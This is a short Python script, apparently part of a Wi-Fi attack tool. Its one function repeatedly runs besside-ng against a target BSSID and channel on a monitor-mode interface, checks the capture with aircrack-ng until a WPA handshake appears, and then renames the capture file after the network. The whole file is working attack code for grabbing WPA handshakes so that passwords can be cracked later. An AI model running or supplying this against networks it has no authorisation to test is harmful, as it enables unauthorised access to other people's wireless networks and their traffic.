#todo: implement handshake function
import os 
import subprocess
def get_handshake(ssid,bssid,channel):
    found = False
    while not found:
        command = f"besside-ng -b {bssid} -c {channel} wlan1mon"
        print("Trying to get the handshake ......")
        process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
        output, error = process.communicate()

        command = f"aircrack-ng wpa.cap"
        process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
        output, error = process.communicate()
        ssid = ssid.replace(' ', '_')
        if "WPA (1 handshake)" in output.decode():
            found = True
            os.rename("./wpa.cap", f"./{ssid}_{bssid}.cap")

    return f"{ssid}_{bssid}.cap"